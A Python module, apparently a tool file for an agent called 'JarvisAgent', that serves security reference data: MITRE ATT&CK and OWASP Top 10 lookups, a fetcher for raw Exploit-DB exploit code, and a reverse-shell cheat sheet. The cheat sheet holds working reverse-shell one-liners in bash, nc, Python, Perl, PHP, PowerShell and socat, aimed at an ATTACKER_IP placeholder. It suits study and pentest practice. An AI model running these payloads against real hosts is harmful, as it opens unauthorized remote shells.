"""
security_modules/reference_tools.py — Structured, curated security reference content.
Practice-tagged, no AuthorizationCheck gate: nothing here names a target to attack — most
functions are pure in-memory lookups (same class of tool as cert_study_session/
get_security_reference); exploitdb_usage makes one read-only fetch of a public,
already-published Exploit-DB page, not a call against anyone's live infrastructure.

The MITRE/OWASP data below is a curated static dataset, not the full live MITRE ATT&CK
STIX bundle (tens of MBs) or a scraped copy of owasp.org — small, dependency-free, and
covers what actually gets reached for in day-to-day study/reference use.
"""

# ---------------------------------------------------------------------------
# MITRE ATT&CK (Enterprise) — tactics with representative, well-known techniques.
# ---------------------------------------------------------------------------

MITRE_ATTACK = {
    "reconnaissance": {
        "id": "TA0043",
        "description": "Adversary is gathering information to plan future operations.",
        "techniques": [
            {"id": "T1595", "name": "Active Scanning", "summary": "Probing victim infrastructure via network/vulnerability scans."},
            {"id": "T1593", "name": "Search Open Websites/Domains", "summary": "Social media, search engines, code repos for info gathering."},
            {"id": "T1589", "name": "Gather Victim Identity Information", "summary": "Credentials, email addresses, employee names."},
        ],
    },
    "resource-development": {
        "id": "TA0042",
        "description": "Adversary is establishing resources to support operations.",
        "techniques": [
            {"id": "T1583", "name": "Acquire Infrastructure", "summary": "Domains, servers, cloud accounts, botnets."},
            {"id": "T1587", "name": "Develop Capabilities", "summary": "Malware, exploits, digital certificates."},
        ],
    },
    "initial-access": {
        "id": "TA0001",
        "description": "Adversary is trying to get into your network.",
        "techniques": [
            {"id": "T1566", "name": "Phishing", "summary": "Spearphishing attachment/link/service to gain initial foothold."},
            {"id": "T1190", "name": "Exploit Public-Facing Application", "summary": "Exploiting a vulnerability in an internet-facing app or service."},
            {"id": "T1078", "name": "Valid Accounts", "summary": "Using legitimate compromised credentials."},
        ],
    },
    "execution": {
        "id": "TA0002",
        "description": "Adversary is trying to run malicious code.",
        "techniques": [
            {"id": "T1059", "name": "Command and Scripting Interpreter", "summary": "PowerShell, bash, Python, etc."},
            {"id": "T1204", "name": "User Execution", "summary": "Victim opens/runs a malicious file or link."},
        ],
    },
    "persistence": {
        "id": "TA0003",
        "description": "Adversary is trying to maintain their foothold.",
        "techniques": [
            {"id": "T1053", "name": "Scheduled Task/Job", "summary": "Cron, Task Scheduler, systemd timers for recurring execution."},
            {"id": "T1547", "name": "Boot or Logon Autostart Execution", "summary": "Registry run keys, startup folder."},
        ],
    },
    "privilege-escalation": {
        "id": "TA0004",
        "description": "Adversary is trying to gain higher-level permissions.",
        "techniques": [
            {"id": "T1068", "name": "Exploitation for Privilege Escalation", "summary": "Exploiting a vuln to gain SYSTEM/root."},
            {"id": "T1055", "name": "Process Injection", "summary": "Injecting code into a legitimate, higher-privileged process."},
        ],
    },
    "defense-evasion": {
        "id": "TA0005",
        "description": "Adversary is trying to avoid being detected.",
        "techniques": [
            {"id": "T1070", "name": "Indicator Removal", "summary": "Clearing logs, deleting files, timestomping."},
            {"id": "T1027", "name": "Obfuscated Files or Information", "summary": "Packing, encoding, encrypting payloads."},
        ],
    },
    "credential-access": {
        "id": "TA0006",
        "description": "Adversary is trying to steal account names and passwords.",
        "techniques": [
            {"id": "T1110", "name": "Brute Force", "summary": "Password guessing, spraying, credential stuffing."},
            {"id": "T1003", "name": "OS Credential Dumping", "summary": "LSASS, SAM, /etc/shadow dumping."},
        ],
    },
    "discovery": {
        "id": "TA0007",
        "description": "Adversary is trying to figure out your environment.",
        "techniques": [
            {"id": "T1082", "name": "System Information Discovery", "summary": "OS version, hostname, hardware."},
            {"id": "T1046", "name": "Network Service Discovery", "summary": "Port/service scanning within a compromised network."},
        ],
    },
    "lateral-movement": {
        "id": "TA0008",
        "description": "Adversary is trying to move through your environment.",
        "techniques": [
            {"id": "T1021", "name": "Remote Services", "summary": "RDP, SSH, SMB/WinRM to move between hosts."},
            {"id": "T1550", "name": "Use Alternate Authentication Material", "summary": "Pass-the-hash, pass-the-ticket."},
        ],
    },
    "collection": {
        "id": "TA0009",
        "description": "Adversary is trying to gather data of interest.",
        "techniques": [
            {"id": "T1005", "name": "Data from Local System", "summary": "Files staged from the local filesystem."},
            {"id": "T1113", "name": "Screen Capture", "summary": "Screenshots for intel/exfil."},
        ],
    },
    "command-and-control": {
        "id": "TA0011",
        "description": "Adversary is trying to communicate with compromised systems.",
        "techniques": [
            {"id": "T1071", "name": "Application Layer Protocol", "summary": "C2 blended into HTTP/DNS/HTTPS traffic."},
            {"id": "T1090", "name": "Proxy", "summary": "Routing C2 through intermediaries to hide the true destination."},
        ],
    },
    "exfiltration": {
        "id": "TA0010",
        "description": "Adversary is trying to steal data.",
        "techniques": [
            {"id": "T1041", "name": "Exfiltration Over C2 Channel", "summary": "Data sent out via the existing C2 channel."},
            {"id": "T1567", "name": "Exfiltration Over Web Service", "summary": "Cloud storage, paste sites, etc. used as an exfil path."},
        ],
    },
    "impact": {
        "id": "TA0040",
        "description": "Adversary is trying to manipulate, interrupt, or destroy systems/data.",
        "techniques": [
            {"id": "T1486", "name": "Data Encrypted for Impact", "summary": "Ransomware."},
            {"id": "T1499", "name": "Endpoint Denial of Service", "summary": "Resource exhaustion to take a service down."},
        ],
    },
}


def mitre_attack_lookup(query: str) -> dict:
    """
    Look up a MITRE ATT&CK tactic or technique by name, ID, or keyword. Matches against
    tactic names/IDs and technique names/IDs/summaries. Returns every match — use a
    specific technique ID (e.g. "T1110") for a precise single hit.
    """
    q = (query or "").strip().lower()
    if not q:
        return {"query": query, "matches": [], "note": "Provide a tactic name, technique name, or technique ID (e.g. T1110)."}

    matches = []
    for tactic_key, tactic in MITRE_ATTACK.items():
        tactic_hit = q in tactic_key or q in tactic["id"].lower() or q in tactic["description"].lower()
        for tech in tactic["techniques"]:
            tech_hit = (
                q in tech["id"].lower() or q in tech["name"].lower() or q in tech["summary"].lower()
            )
            if tactic_hit or tech_hit:
                matches.append({
                    "tactic": tactic_key, "tactic_id": tactic["id"],
                    "technique_id": tech["id"], "technique_name": tech["name"],
                    "summary": tech["summary"],
                })

    if not matches:
        return {
            "query": query, "matches": [],
            "available_tactics": list(MITRE_ATTACK.keys()),
            "note": "No match in the curated reference set. Try a tactic name from available_tactics, "
                    "or check attack.mitre.org directly for the full framework.",
        }
    return {"query": query, "count": len(matches), "matches": matches}


# ---------------------------------------------------------------------------
# OWASP Top 10 (2021)
# ---------------------------------------------------------------------------

OWASP_TOP_10 = {
    "A01": {"name": "Broken Access Control", "example": "Modifying a URL/parameter to view another user's data (IDOR).",
            "mitigation": "Deny by default, enforce authorization server-side on every request, avoid exposing raw object IDs."},
    "A02": {"name": "Cryptographic Failures", "example": "Storing passwords in plaintext or with a fast, unsalted hash.",
            "mitigation": "Use strong, salted, slow hashing (bcrypt/argon2) for passwords; TLS everywhere; encrypt sensitive data at rest."},
    "A03": {"name": "Injection", "example": "SQL/NoSQL/OS command injection via unsanitized user input.",
            "mitigation": "Parameterized queries, input validation, least-privilege DB accounts, avoid string-concatenated commands."},
    "A04": {"name": "Insecure Design", "example": "A password-reset flow that doesn't rate-limit or verify the requester.",
            "mitigation": "Threat model during design, use secure design patterns, don't bolt security on after the fact."},
    "A05": {"name": "Security Misconfiguration", "example": "Default credentials, verbose error messages, unnecessary features enabled.",
            "mitigation": "Hardened baseline configs, minimal attack surface, automated config auditing."},
    "A06": {"name": "Vulnerable and Outdated Components", "example": "Running a library with a known, unpatched CVE.",
            "mitigation": "Inventory dependencies, monitor CVE feeds, patch promptly (see check_dependency_vulnerabilities)."},
    "A07": {"name": "Identification and Authentication Failures", "example": "No brute-force protection, weak session management.",
            "mitigation": "MFA, rate-limit auth endpoints, secure session tokens, proper logout/invalidation."},
    "A08": {"name": "Software and Data Integrity Failures", "example": "Auto-updating from an unsigned/unverified source (supply chain).",
            "mitigation": "Verify signatures/checksums, use trusted registries, CI/CD pipeline integrity checks."},
    "A09": {"name": "Security Logging and Monitoring Failures", "example": "A breach goes undetected for months because nothing alerted.",
            "mitigation": "Centralized logging, alerting on suspicious patterns, retain logs, test incident response."},
    "A10": {"name": "Server-Side Request Forgery (SSRF)", "example": "An app fetches a user-supplied URL, attacker points it at internal infra.",
            "mitigation": "Allowlist outbound destinations, disable unused URL schemes, network segmentation."},
}


def owasp_top10_reference(topic: str = None) -> dict:
    """Return one OWASP Top 10 (2021) category by code/name keyword, or all ten if no
    topic is given."""
    if not topic:
        return {"topic": None, "categories": [{"code": k, **v} for k, v in OWASP_TOP_10.items()]}

    q = topic.strip().lower()
    for code, info in OWASP_TOP_10.items():
        if q == code.lower() or q in info["name"].lower():
            return {"topic": topic, "code": code, **info}

    return {
        "topic": topic, "match": None,
        "available": [f"{k}: {v['name']}" for k, v in OWASP_TOP_10.items()],
        "note": "No exact match — pick one from 'available' or call with no topic for the full list.",
    }


# ---------------------------------------------------------------------------
# EXPLOIT-DB USAGE — the published, public content for a specific EDB entry
# ---------------------------------------------------------------------------

def exploitdb_usage(edb_id: str) -> dict:
    """
    Fetch the published usage notes/source for a specific Exploit-DB entry by ID — the
    exact public content at exploit-db.com/raw/{id}, the same page search_exploitdb's
    results already link to. Read-only reference to already-public research; no target is
    touched and nothing is executed.
    """
    edb_id = str(edb_id).strip().lstrip("#")
    if not edb_id.isdigit():
        return {"edb_id": edb_id, "error": "edb_id should be a numeric Exploit-DB ID, e.g. '50944'."}

    try:
        import requests
        r = requests.get(f"https://www.exploit-db.com/raw/{edb_id}", timeout=15,
                          headers={"User-Agent": "JarvisAgent/1.0"})
        r.raise_for_status()
    except Exception as e:
        return {"edb_id": edb_id, "error": f"fetch failed: {e}"}

    return {
        "edb_id": edb_id, "url": f"https://www.exploit-db.com/exploits/{edb_id}",
        "content": r.text[:8000], "truncated": len(r.text) > 8000,
    }


# ---------------------------------------------------------------------------
# REVERSE SHELL CHEAT SHEET — static reference, no target
# ---------------------------------------------------------------------------

_REVERSE_SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash-fifo": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f",
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "python3": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
               's.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
               'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    # Same doubled-brace note as powershell below — Perl's if(){...} block braces are
    # literal syntax, not format placeholders.
    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    # Note the doubled {{ }} around every literal PowerShell brace below (script blocks,
    # the while loop) — this string goes through str.format() to fill in lhost/lport, and
    # a bare '{' or '}' there is a format-spec placeholder, not literal PowerShell syntax.
    "powershell": (
        '$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();'
        "[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
        "$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};$client.Close()"
    ),
    "socat": 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}',
}


def reverse_shell_cheatsheet(shell_type: str = None, lhost: str = "ATTACKER_IP", lport: int = 4444) -> dict:
    """
    Static reference: common reverse-shell one-liners, filled in with your listener's
    lhost/lport if given (placeholders otherwise). No target involved — this describes what
    runs on YOUR listener plus the payload side, nothing here reaches out anywhere by
    itself. Pair with `nc -lvnp <port>` (or msfconsole's multi/handler) as the listener.
    """
    if shell_type:
        key = shell_type.strip().lower()
        if key not in _REVERSE_SHELL_TEMPLATES:
            return {"shell_type": shell_type, "error": "unknown shell_type",
                    "available": sorted(_REVERSE_SHELL_TEMPLATES.keys())}
        return {
            "shell_type": key, "command": _REVERSE_SHELL_TEMPLATES[key].format(lhost=lhost, lport=lport),
            "listener_hint": f"nc -lvnp {lport}",
        }

    return {
        "lhost": lhost, "lport": lport,
        "shells": {k: v.format(lhost=lhost, lport=lport) for k, v in _REVERSE_SHELL_TEMPLATES.items()},
        "listener_hint": f"nc -lvnp {lport}",
    }
